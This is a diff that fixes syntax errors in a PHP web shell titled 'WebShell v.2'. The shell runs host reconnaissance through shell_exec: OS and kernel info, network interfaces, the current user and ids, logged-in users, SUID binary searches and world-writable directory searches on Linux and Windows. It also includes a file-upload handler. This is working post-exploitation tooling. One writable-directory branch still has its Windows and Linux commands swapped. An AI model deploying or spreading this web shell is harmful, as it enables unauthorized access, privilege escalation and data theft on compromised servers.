@@ -148,11 +148,13 @@ code, pre {
 <?php
 echo '<body style="background-color:#424242;">';
 ?>
-<!-- check if os is windows or linux -->
-function isWindows(): bool
+
+<?php
+function isWindows()
 {
-    return PHP_OS_FAMILY === 'Windows';
+    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
 }
+?>
 
 <!-- Authenticated -->
 <font style="float:left;" color="#F1F1F1"><b>WebShell v.2 <:~ </b></font><br /><br />
@@ -181,8 +183,8 @@ function isWindows(): bool
 <br><br>
 <b>Kernel & OS Info</b>
 <?php
-  if (isWindows){
-      $uname  shell_exec{"systeminfo"};
+  if (isWindows()){
+      $uname = shell_exec("systeminfo");
       echo"<pre>$uname<pre>";
   }else {
     $uname = shell_exec("uname -a;" .
@@ -194,7 +196,7 @@ function isWindows(): bool
 
 <b>Network interfaces</b>
 <?php
-if (isWindows){
+if (isWindows()){
   $ip_addr = shell_exec("ipconfig");
   echo "<pre>$ip_addr</pre>";
 }else{
@@ -205,7 +207,7 @@ if (isWindows){
 
 <b>disks</b>
 <?php
-if ()!isWindows){
+if (!isWindows()){
   $disk = shell_exec("df -h");
   echo "<pre>$disk</pre>";
   }
@@ -217,7 +219,7 @@ else {
 
 <b>User info</b>
 <?php
-if (!isWindows){
+if (!isWindows()){
   $user = shell_exec("whoami; id");
   echo "<pre>$user</pre>";
 }
@@ -229,7 +231,7 @@ else{
 
 <b> Connected Users </b>
 <?php
-if (!isWindows){
+if (!isWindows()){
   $users = shell_exec("who -u");
   echo "<pre>$users</pre>";
 }else{
@@ -240,12 +242,12 @@ if (!isWindows){
 
 <b>SUIDS</b>
 <?php
-if (!isWindows){
+if (!isWindows()){
   $SUIDS = shell_exec("find / -xdev -maxdepth 4 -perm -4000 -type f 2>/dev/null");
   echo "<pre>$SUIDS</pre>";
 }
 else {
-  echo "<pre> OS is wndows no suids to be found </pre>"
+  echo "<pre> OS is windows no suids to be found </pre>";
 }
 ?>
 
@@ -282,7 +284,7 @@ echo "<pre>$pwd</pre>";
 
 <b> R/W dirs for you </b>
 <?php
-  if (isWindows){
+  if (isWindows()){
     $R_W_dirs = shell_exec(
       "find / -xdev \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) " .
       "-prune -o -type d -perm -0002 -print 2>/dev/null"
@@ -290,15 +292,15 @@ echo "<pre>$pwd</pre>";
   echo "<pre>$R_W_dirs</pre>";
   }
   else{
-    $R_W_dirs = shell_exec("powershell Get-ChildItem C:\ -Directory -Recurse -ErrorAction SilentlyContinue |
+    $R_W_dirs = shell_exec("powershell Get-ChildItem C:\\ -Directory -Recurse -ErrorAction SilentlyContinue |
 ForEach-Object {
     try {
-        $test = Join-Path $_.FullName ".__writetest"
+        $test = Join-Path $_.FullName \".__writetest\"
         New-Item -Path $test -ItemType File -Force -ErrorAction Stop | Out-Null
         Remove-Item $test -Force
         $_.FullName
     } catch {}
-  }")
+}");
   }
   ?>
 </div>
@@ -329,7 +331,6 @@ if (isset($_FILES['file'])) {
 }
 ?>
 </div>
-
 
 
 
